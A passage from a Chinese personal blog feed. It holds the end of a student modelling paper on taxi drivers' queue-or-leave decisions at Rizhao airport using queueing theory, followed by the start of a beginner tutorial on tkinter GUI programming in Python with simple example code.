title="2.1模型假设"></a>2.1模型假设</h4><p>根据题意进行如下假设</p><p>（1）假设乘客在机场乘车需经历排队过程而非完全随机。</p><p>（2）不同时间段到达航班数量不同，视为不同变量。</p><p>（3）忽略国内航班与国际航班及不同客机型号载客量的差异。</p><p>（4）忽略时令导致的航班时刻变化，将全年某一航班到达时间视为相同。</p><p>（5）忽略航班取消，晚点等不可抗力影响。</p><p>（6）假设出租车司机只接待从市中心到机场与从离开机场的乘客。</p><p>（7）决策的选择仅考虑经济因素，忽略个人倾向等其他因素。</p><h4 id="2-2符号说明"><a href="#2-2符号说明" class="headerlink" title="2.2符号说明"></a>2.2符号说明</h4><table><thead><tr><th>符号</th><th>含义</th><th>单位</th></tr></thead><tbody><tr><td>Q</td><td>模型决策变量，根据所得Q值进行决策</td><td></td></tr><tr><td>N（t）</td><td>排队车辆数目</td><td>辆</td></tr><tr><td>L</td><td>机场到市中心距离</td><td>千米</td></tr><tr><td>R</td><td>市区半径</td><td>千米</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps1.jpg"></td><td>司机等待载客预期收益</td><td>元</td></tr><tr><td>T</td><td>等待载客的排队时间</td><td>小时</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps2.jpg"></td><td>出租车司机的平均时薪</td><td>元</td></tr><tr><td>k</td><td>航班的平均载客数</td><td>人</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps3.jpg"></td><td>车辆接受服务的平均时间</td><td>秒</td></tr><tr><td>λ</td><td>单位时刻出租车到达的数量</td><td>辆</td></tr><tr><td>c</td><td>车站的上车点数</td><td>个</td></tr><tr><td><img src=".%5C%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94%5Cwps4.jpg"></td><td>平均服务率</td><td></td></tr></tbody></table><h3 id="三、问题分析："><a href="#三、问题分析：" class="headerlink" title="三、问题分析："></a>三、问题分析：</h3><p>为充分分析决策的影响因素及其机理，我们可以将影响出租车司机决策的因素简单估计成，在机场选择留下等待送客和选择在市区拉客各自参生的的预期利润。   </p><p>综上所述我们可以将司机所作出的决策，所产生结果下分为两个部分</p><table><thead><tr><th></th><th>司机是否进行排队等待</th><th>空载或载客</th></tr></thead><tbody><tr><td>1</td><td>是</td><td>全程载客</td></tr><tr><td>2</td><td>否</td><td>空载返回</td></tr></tbody></table><p>一、排队等候，通过排队车辆数，航班到站时间等情况估算等候的时间成本，并结合载客回市区的收益得出采取此决策的预期利润。</p><p>二、空载返回,将空跑损耗作为成本，估计返回节省下的等候时间在市区拉客产生的收益，同样地可以给出采取空载返回能够顺利载客情况下，决策的预期利润。</p><p>三、假设在空载返回后，能够立刻拉客，在市区等待载客的时间能够忽略不计。</p><p>在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。机场的出租车载客收益与载客的行驶里程有关，乘客的目的地有远有近，但总体保持在市区范围内。</p><h3 id="四、样例分析："><a href="#四、样例分析：" class="headerlink" title="四、样例分析："></a>四、样例分析：</h3><p>以日照机场为例，由于学校所在地为日照，通过日照本地宝等平台对日照机场部分信息进行了收集处理。日照机场主要运营国内航向到站时间集中于上午九时至晚九时，出站时间为上午十时至晚二十二时。</p><p>统计结果如下图所示：</p><center><img src=".\数学建模国赛选拔\wps5.jpg" style="zoom:80%;" /> </center><center>图3-1 日照国际航空港到站航班频率分布图</center><center><img src=".\数学建模国赛选拔\wps6.jpg" style="zoom:80%;" /> </center>图4-2 日照市国际航空港离港航班时刻统计图<p>显而易见的是，一天之内乘客到站时间并不是均匀分布，而是集中于几个时间段内，所以在不同时间情况下，司机做出决策应不同。</p><p>同时我们可以查询到，日照市机场大巴发车时刻表，根据相应数据做出折线图如下:</p><center><img src=".\数学建模国赛选拔\wps7.jpg" style="zoom:80%;" /> </center><center>图4-3 日照市机场大巴发车时刻表</center>日照市机场大巴发车时间安排集中于下午十三时至十五时与晚十七时至20时，结合航班到站时间发现，机场大巴到达时间相较于航班抵达时间高峰有一定迟滞性。结合实际情况，由于乘客下机后需办理行李提取、海关检疫等一系列手续，故乘客离开的高峰需顺延1至2小时。故出租车运营时间将有一定滞后性。<p>为了方便决策方案的给出，根据出港人流量和机场大巴时间安排的高峰、低谷，并结合实际情况将一天分为0至9时;9至13时;14时至15时;15至17时，17至20时；21时至0时数个时间段，具体划分方案如下:</p><p>0至9时与20时至0时，机场无航班进出不做考虑。9至13时与15至17时存在航班，机场大巴尚未开行，出租车运送乘客占比较高，14时至15时与17至20时机场大巴开行时间段，出租车运送乘客占比较低。</p><p>在司机接送旅客收入方面：日照市出租车执行的收费标准为：SP0+M(s)（S-2），即2公里内为起步价SP0， 超过两公里部分按里程的不同进行阶梯计价。</p><center><img src=".\数学建模国赛选拔\wps8.jpg" style="zoom:80%;" /> </center><center>图4-4 日照市机场与市区分布图</center>同时国内机场普遍离城市中心比较远，以日照市为例，日照市机场位于市区西南方向，距市区25至30公里。<h3 id="五、决策模型建立："><a href="#五、决策模型建立：" class="headerlink" title="五、决策模型建立："></a>五、决策模型建立：</h3><p>本题为决策问题,我们可以建立模型对司机进行决策的过程进行描述。</p><h4 id="5-1目标函数的建立"><a href="#5-1目标函数的建立" class="headerlink" title="5.1目标函数的建立"></a>5.1目标函数的建立</h4><p>设Z为司机通过决策也已获得的利润，可将某种决策下的利润P（profit）表示为:</p><center><img src=".\数学建模国赛选拔\wps9.jpg" style="zoom:100%;" /> </center>Q为决变量，决定了采取的决策，结合现实状况，出租车司机不可能同时空车返回市区和等待，Q的取值即为[0,1],若Q取1，代表等选择等待载客，Q=0则代表空载返回。P1、P2分别代表了(A)、(B)两方案的利润。如此规定后,便可以通过目标函数对利润Z求取最大值即可。<center><img src=".\数学建模国赛选拔\wps10.jpg" style="zoom:100%;" /></center>#### 5.2所有可能情况的阐释<p>由此可以得出影响司机决策的因素有:载客的利润期望、空载返回的时间以及消耗、市区载客的预期利润。对这些因素继续进行具体分析，可以发现司机的决策实际上由多个要素共同决定:排队车辆数N（t）、返回路程S，收费标准M(S)、当前时间段内抵达机场的航班数量N、等待载客的时间成本（TS）。其中，排队车辆数M和机场返回市区乘客数量N，决定了等待时间T，返回路程和收费标准共同影响了载客利润P1。另外返回路程还制约了空载损耗的大小，收费标准还决定了司机在市区的收益。</p><h5 id="5-2-1基于排队载客的模型建立："><a href="#5-2-1基于排队载客的模型建立：" class="headerlink" title="5.2.1基于排队载客的模型建立："></a>5.2.1基于排队载客的模型建立：</h5><p>基于排队载客P1，其收益为收入减去成本，此处的成本包括时间成本及载客过程中油耗和过路费等。在一般情况下过路费包含在乘客付款中可以忽略不计。</p><center><img src=".\数学建模国赛选拔\wps11.jpg" style="zoom:100%;" /> </center>由于阶梯计价的计价策略，载客收入W1为分段函数，在起步距离S0以内部分收费SP0，以外部分采取阶梯计价可表示为：<center><img src=".\数学建模国赛选拔\wps12.jpg" style="zoom:100%;" /> </center>在此表达式中等待载客的时间成本TS1，可以看做等待时间与单位时间下的平均收益的比值。<p>设司机的单位时间平均收入为ρ，T为等候载客的时间。</p><center><img src=".\数学建模国赛选拔\wps13.jpg" style="zoom:100%;" /> </center>再此基础上，出租车在机场排队可能等待时间T，取决于不同时段航班的到达规律、出租车的排队数量。由于不同时间阶段下，等待载客的时间T存在较大波动<p>在前文的样例分析中，可知不同时间段乘坐公交车的乘客数，占航班总旅客数的占比是不同的,不妨设在在无机场大巴时总客流量与乘坐出租车旅客数比例为C1，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2</p><center><img src=".\数学建模国赛选拔\wps14.jpg" style="zoom:100%;" /> </center><img src=".\数学建模国赛选拔\wps15.jpg" style="zoom:100%;" />表示机场一时间阶段内抵达的乘客，由假设中设忽略国内航班与国际航班及不同客机型号载客量的差异，设k为航班的平均载客数，有如下判断：<center><img src=".\数学建模国赛选拔\wps16.jpg" style="zoom:100%;" /> </center>**等待时间T的确定：**<p>旅客乘坐飞机到达空港客运交通枢纽的集聚规律服从泊松分布[1],设出租车到达率同样服从Poisson分布，由排队论可知，当输入过程为泊松流时，车辆到达的时间间隔服从负指数分布</p><p>平均服务率，设置机场存在c个上车点，每辆车接受服务的平均时间记为µ0，接受服务的时间服从正态分布。其中每辆车接受服务的平均时间记为µ0,可视为常量。</p><p>当乘车人数时可以认为乘车人数足够多，只需要考虑每辆车的接受服务时间</p><center><img src=".\数学建模国赛选拔\wps22.jpg" style="zoom:100%;" /> </center>N0表示每小时内有多少辆车接受服务<p>当乘车人数时,在排队过程中，必然出行在队首车辆会进入等待，设此时的额外等待时间为，</p><center><img src=".\数学建模国赛选拔\wps25.jpg" style="zoom:100%;" /> </center>则平均服务率为<center><img src=".\数学建模国赛选拔\wps26.jpg" style="zoom:100%;" /></center>当成等待区乘客数量稳定时，由排队论可知，系统此时满足M/M/C/∞/∞/FCFS的状况。它表示：在a个服务台与先到先服务前提下，车站蓄车池容量无限与到站客源无限，出租车到达相互独立，且服从参数为λ的泊松分布；同时，出租车的服务时间服从参数为µ的负指数分布。其中，λ表示单位时刻出租车到达的数量，Ε(t)表示系统的平均服务率，即单位时间内离开排队池的出租车数量。<p>则服务强度为：</p><center><img src=".\数学建模国赛选拔\wps29.jpg" style="zoom:100%;" /> </center>系统平均等待车辆数LQ<center><img src=".\数学建模国赛选拔\wps30.jpg" style="zoom:100%;" /> </center>由上式：令n`=n-c对应公式经化简可得：<center><img src=".\数学建模国赛选拔\wps31.jpg" style="zoom:100%;" /> </center>蓄车池空闲概率P0:<center><img src=".\数学建模国赛选拔\wps32.jpg" style="zoom:100%;" /> </center>由Little公式，得司机平均等待时间为:<center><img src=".\数学建模国赛选拔\wps33.jpg" style="zoom:100%;" /> </center>则每辆出租车的逗留时间为：<center><img src=".\数学建模国赛选拔\wps34.jpg" style="zoom:100%;" /> </center>##### 5.2.2基于返回拉客的模型建立:<p>基于返回拉客P2，其收益为收入减去成本，此处的成本包含，由机场返回市中心的折算时间成本，空载返回产生油耗等。</p><p>假设司机选择空载返回市区接客，假设市区乘客数量足够，即不需要在市区等待乘客，此时预期能获得的收益W2为选择在飞机场排队载客时的时间成本。</p><center><img src=".\数学建模国赛选拔\wps35.jpg" style="zoom:100%;" /> <center>由于在不同城市，城市规划及市区发展的现实不同，不妨设从机场到达市中心的距离为L，城区半径为r,则任一乘客搭乘出租车返回市区的距离S服从N(L,r2),所以可设<p>为空载返回时的损失。故出租车从机场载客返回市区总收益为：节约排队载客的时间成本与空载返回产生油耗过路费等损耗与返程中的时间成本之差。</p><p>综上所述：</p><center><img src=".\数学建模国赛选拔\wps37.jpg" style="zoom:100%;" /> </center>折算的时间成本TS2可以表示为： <p>其中V为出租车行驶的平均速度，ρ为司机的单位时间平均收入 </p><center><img src=".\数学建模国赛选拔\wps40.jpg" style="zoom:100%;" /> <center><h4 id="5-3决策模型："><a href="#5-3决策模型：" class="headerlink" title="5.3决策模型："></a>5.3决策模型：</h4><p>从模型中得到的Q即为推荐司机选择排队的概率，其取值范围为[0, 1]。Q越大，更推荐司机选择在排队区等待，反之则是空载，具体如下： </p><p>(1)，司机最好选择在排队区等待，此时排队预期平均收益高于空载返回的预期收益。</p><p>(2) P &lt; 0.5，司机最好选择空载返回，此时排队预期平均收益低于空载返回的预期收益。</p><h3 id="六、选择模型的检验与合理性分析"><a href="#六、选择模型的检验与合理性分析" class="headerlink" title="六、选择模型的检验与合理性分析"></a>六、选择模型的检验与合理性分析</h3><p>在前面的样例分析阶段的研究中，探讨了日照市机场的相关信息，接下来将以日照市为例对模型进行检验和合理性分析。</p><p>中心商务区（CBD）是指一个城市里主要商业活动进行的地区同时也是市中心，在日照市我们可以将万达及华润万象汇所在的区域定义为日照市的中心商务区。</p><center><img src=".\数学建模国赛选拔\wps43.jpg" style="zoom:100%;" /> </center><center>图6-1 出租车路线规划图</center><center><img src=".\数学建模国赛选拔\wps44.jpg" style="zoom:100%;" /> </center>通过百度地图可查，由日照山字河国际机场到市中心依路线不同，其距离为29±3公里，即如此可以确定路程L=29，市区范围R=3，返回市区的平均时间t约为41分钟。并结合收费标准得到载客回市区收益W1，带入数据得。<center>W1=57.62</center>考虑到空载和载人对汽车油耗影响较小，可以忽略不计，由于日照市出租车车型并不统一，此处采用可查数据中出现的大众捷达车型，油耗为5.7L/100km，目前国内油价为8.43元/L。可以计算：<center><img src=".\数学建模国赛选拔\wps45.jpg" style="zoom:100%;" /> </center>同时通过找工易平台获取信息为，山东省出租车司机的平均薪资为11479元/月，出租车司机工作时间为11个小时，每个月休息2天，如此可以推算日照市出租车司机在市中心每小时的利润为:<center><img src=".\数学建模国赛选拔\wps46.jpg" style="zoom:100%;" /> </center>可以计算出租车司机空载返回时的时间成本为： <p>同时日照市机场作为中小型机场，其到站客流波动较大，结合上文分析可粗略估计在无机场大巴时总客流量与乘坐出租车旅客数比例为C1=0.32，当机场大巴正常运行时总客流量与乘坐出租车旅客数比例为C2=0.22，结合航班到站时间有：</p><table><thead><tr><th></th><th>9至13时</th><th>13至15时</th><th>15至16时</th><th>16至17时</th><th>17至18时</th><th>18至20时</th><th>20至21时</th><th>21时至次日9时</th></tr></thead><tbody><tr><td>平均打车数</td><td>56</td><td>27.5</td><td>0</td><td>148</td><td>66</td><td>11</td><td>64</td><td>0</td></tr><tr><td>平均服务率</td><td>80</td><td>43.64</td><td></td><td>80</td><td>80</td><td>70.9</td><td>80</td><td></td></tr></tbody></table><p>表6-1 日照市国际机场不同时间段的平均打车数即平均服务率统计表</p><p>由山东省公共数据公开网可以查询到日照市交通运输局发布的日照市市直出租车信息汇总，日照市市区共有出租车969辆。由于部分关键数据缺失，这里采用其他城市数据进行估算，设λ=42，为90s，设日照市机场服务台数为2。</p><p>平均服务率可同时求出，以标记正在上表中</p><p>当在13-16时，18至20时，21时至次日9时三个时间段内，乘客数量小于到达的车辆数量，则平均服务率为以13-16时为例</p><p>E(t)=43.64带入公式</p><center><img src=".\数学建模国赛选拔\wps50.jpg" style="zoom:100%;" /> <center><center><img src=".\数学建模国赛选拔\wps51.jpg" style="zoom:100%;" /> </center><center><img src=".\数学建模国赛选拔\wps52.jpg" style="zoom:100%;" /> </center>此时Wq远大于，可以忽略不计<center><img src=".\数学建模国赛选拔\wps54.jpg" style="zoom:100%;" /> <center><p>此时，结果为负，=47.902，应选择空载返回市区。</p><p>同理当其余时间段，乘客数量大于到达的车辆数量，则平均服务率为<img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml9260\wps57.jpg" alt="img">，易证此时P1&gt;P2应选择排队载客。</p><p>综上所述对于日照市机场有以下判断：</p><table><thead><tr><th align="center">时间</th><th align="center">13-16时，18至20时，21时至次日9时</th><th align="center">9至13时，16至18时，20至21时</th></tr></thead><tbody><tr><td align="center">司机选择</td><td align="center">返回拉客</td><td align="center">等待载客</td></tr></tbody></table><p>表6-2 针对日照市特点下不同时间段预测数据</p><p>在不同时间阶段下，模型能够做出不同判断，保证出租车司机的利益最大化，可以证明模型具有合理性。</p><h3 id="七、-模型改进方向"><a href="#七、-模型改进方向" class="headerlink" title="七、 模型改进方向"></a>七、 模型改进方向</h3><p>在本题中，选择机场为中小型机场在模拟过程中航班到达量不同时间段内，波动较大。同时在模型检验和合理性分析阶段，因为部分条件获取难度较大采取使用其他数据进行估计，并不能保证完全准确。在估计机场乘客数的推断中，在模型建立之初故意选择性的忽视了不同航班载客量的差异，将其视为相同参数，若将其进行妥善分析能进一步提高模型的准确率与可靠性。</p><p>参考文献</p><p>[1]何汉.大型空港客运交通枢纽客流集散规律研究.铁道运输与经济. 2019.04.17</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数学建模：综合选拔题&quot;&gt;&lt;a href=&quot;#数学建模：综合选拔题&quot; class=&quot;headerlink&quot; title=&quot;数学建模：综合选拔题&quot;&gt;&lt;/a&gt;数学建模：综合选拔题&lt;/h2&gt;&lt;h3 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python的GUI编程和tkinter，Wxpython</title>
    <link href="https://shierjinghuang.github.io/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/"/>
    <id>https://shierjinghuang.github.io/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/</id>
    <published>2022-07-05T14:00:20.000Z</published>
    <updated>2022-07-05T14:09:53.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python的GUI编程和tkinter，Wxpython"><a href="#Python的GUI编程和tkinter，Wxpython" class="headerlink" title="Python的GUI编程和tkinter，Wxpython"></a>Python的GUI编程和tkinter，Wxpython</h1><blockquote><p>PythonGUI这个内容是我在课程论文准备之初临时去学的一些内容，起初我准备学下tkinter做我课程论文项目的前段显示，但是由于临时的一些变动，我最终是采用了Wxpython的方式进行的可视化。当然这两个库在本质上都属于PythonGul。</p></blockquote><p>[TOC]</p><h2 id="PythonGUI介绍："><a href="#PythonGUI介绍：" class="headerlink" title="PythonGUI介绍："></a>PythonGUI介绍：</h2><ul><li><strong>Tkinter：</strong> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</li><li><strong>wxPython：</strong>wxPython 是一款开源软件，是 Python 语言的一套优秀的 GUI 图形库，允许 Python 程序员很方便的创建完整的、功能健全的 GUI 用户界面。</li><li><strong>Jython：</strong>Jython 程序可以和 Java 无缝集成。除了一些标准模块，Jython 使用 Java 的模块。Jython 几乎拥有标准的Python 中不依赖于 C 语言的全部模块。比如，Jython 的用户界面将使用 Swing，AWT或者 SWT。Jython 可以被动态或静态地编译成 Java 字节码。</li></ul><h2 id="tkinter"><a href="#tkinter" class="headerlink" title="tkinter"></a>tkinter</h2><h3 id="根窗体root："><a href="#根窗体root：" class="headerlink" title="根窗体root："></a>根窗体root：</h3><p>根窗体是图像化应用程序的根控制器，是tkinter的底层控件的实例。当导入tkinter模块后，调用 Tk()方法可初始化一个根窗体实例 root ,用 title() 方法可设置其标题文字，用geometry()方法可以设置窗体的大小（以像素为单位）。将其置于主循环中，除非用户关闭，否则程序始终处于运行状态。执行该程序，一个窗体就呈现出来了。在这个主循环的根窗体中，可持续呈现中的其他可视化控件实例，监测事件的发生并执行相应的处理程序 </p><p>主窗口位置和大小通过，geometry(‘wxh ± y ± z’)方法进行设置，w为宽度，h为高度，x用于分隔高度和宽度，+x表示距离屏幕左边的距离，-x表示距离屏幕右边的距离，±y同理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#代码实现：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'我的第一个Python窗体'</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'240x240'</span><span class="token punctuation">)</span> <span class="token comment"># 这里的乘号不是 * ，而是小写英文字母 x</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="GUI组件表："><a href="#GUI组件表：" class="headerlink" title="GUI组件表："></a>GUI组件表：</h3><p>Tkinter的提供各种控件，如按钮，标签和文本框，一个GUI应用程序中使用。这些控件通常被称为控件或者部件。目前有15种Tkinter的部件。</p><table><thead><tr><th>Button</th><th>按钮控件；在程序中显示按钮。</th></tr></thead><tbody><tr><td>Canvas</td><td>画布控件；显示图形元素如线条或文本</td></tr><tr><td>Checkbutton</td><td>多选框控件；用于在程序中提供多项选择框</td></tr><tr><td>Entry</td><td>输入控件；用于显示简单的文本内容</td></tr><tr><td>Frame</td><td>框架控件；在屏幕上显示一个矩形区域，多用来作为容器</td></tr><tr><td>Label</td><td>标签控件；可以显示文本和位图</td></tr><tr><td>Listbox</td><td>列表框控件；在Listbox窗口小部件是用来显示一个字符串列表给用户</td></tr><tr><td>Menubutton</td><td>菜单按钮控件，用于显示菜单项。</td></tr><tr><td>Menu</td><td>菜单控件；显示菜单栏,下拉菜单和弹出菜单</td></tr><tr><td>Message</td><td>消息控件；用来显示多行文本，与label比较类似</td></tr><tr><td>Radiobutton</td><td>单选按钮控件；显示一个单选的按钮状态</td></tr><tr><td>Scale</td><td>范围控件；显示一个数值刻度，为输出限定范围的数字区间</td></tr><tr><td>Scrollbar</td><td>滚动条控件，当内容超过可视化区域时使用，如列表框。.</td></tr><tr><td>Text</td><td>文本控件；用于显示多行文本</td></tr><tr><td>Toplevel</td><td>容器控件；用来提供一个单独的对话框，和Frame比较类似</td></tr><tr><td>Spinbox</td><td>输入控件；与Entry类似，但是可以指定输入范围值</td></tr><tr><td>PanedWindow</td><td>PanedWindow是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td></tr><tr><td>LabelFrame</td><td>labelframe 是一个简单的容器控件。常用与复杂的窗口布局。</td></tr><tr><td>messagebox</td><td>用于显示你应用程序的消息框。</td></tr></tbody></table><h4 id="Python-Tkinter-通用控件属性："><a href="#Python-Tkinter-通用控件属性：" class="headerlink" title="Python Tkinter 通用控件属性："></a>Python Tkinter 通用控件属性：</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657019136331.png"  /><h4 id="Python-Tkinter-按钮组件-Button"><a href="#Python-Tkinter-按钮组件-Button" class="headerlink" title="Python Tkinter 按钮组件 (Button)"></a>Python Tkinter 按钮组件 (Button)</h4><p>按钮组件用于在 Python 应用程序中添加按钮，按钮上可以放上文本或图像，按钮可用于监听用户行为，能够与一个 Python 函数关联，当按钮被按下时，自动调用该函数。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Button <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># master 组件的父容器</span><span class="token comment"># option 可选项，这个包括很多内容这些选项可以用键 = 值的形式设置，并以逗号分隔</span><span class="token comment"># 包括command（按钮的关联函数），font（文本字体），height（按钮的高度），image（按钮的背景图片），width，text（文本），underline（下划线）等内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> Button按钮的状态有：<code>normal</code>  ,  <code>active</code>  ,  <code>disabled</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox top <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">helloCallBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Hello Python"</span><span class="token punctuation">,</span> <span class="token string">"Hello Runoob"</span><span class="token punctuation">)</span>B <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"点我"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>helloCallBack<span class="token punctuation">)</span>B<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里稍微做一点说明，这个实例来自于菜鸟教程，而在菜鸟教程上的写法是 import tkMessageBox ,还是有很多区别的，在python3以后的版本中，tkinter应该首字母小写，而tkMessageBox及库中对应的函数应该相应改为<strong>tkinter.messagebox</strong></p><p>在具体使用按钮组件进行函数调用时也有对应内容：</p><ul><li><p>直接调用函数。<strong>参数表达式为“command=函数名”，注意函数名后面不要加括号，也不能传递参数</strong>。如下面的command=run1：</p></li><li><p>利用匿名函数调用函数和传递参数。参数的表达式为“command=lambda”:函数名（参数列表）</p></li></ul><h5 id="Python-Tkinter-单选按钮控件-Radiobutton"><a href="#Python-Tkinter-单选按钮控件-Radiobutton" class="headerlink" title="Python Tkinter 单选按钮控件(Radiobutton)"></a>Python Tkinter 单选按钮控件(Radiobutton)</h5><p>是为了响应故乡排斥的若干单选项的单击事件以触发运行自定义函数所设的，该控件排除具有共有属性外，还具有显示文本（text）、返回变量（variable）、返回值（value）、响应函数名（command）等重要属性。响应函数名“command=函数名”的用法与Button相同，函数名最后也要加括号。返回变量variable=var通常应预先声明变量的类型var=IntVar()或var=StringVar(),在所调用的函数中方可用var.get()方法获取被选中实例的value值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">Mysel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'甲'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">'乙'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">'丙'</span><span class="token punctuation">&#125;</span>      s <span class="token operator">=</span> <span class="token string">"您选了"</span> <span class="token operator">+</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>var<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"项"</span>      lb<span class="token punctuation">.</span>config<span class="token punctuation">(</span>text <span class="token operator">=</span> s<span class="token punctuation">)</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'单选按钮'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>var <span class="token operator">=</span> IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>rd1 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"甲"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd2 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"乙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd3 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"丙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd3<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python-Tkinter-复选框（Checkbutton）"><a href="#Python-Tkinter-复选框（Checkbutton）" class="headerlink" title="Python Tkinter 复选框（Checkbutton）"></a>Python Tkinter 复选框（Checkbutton）</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义方法</span>w <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token 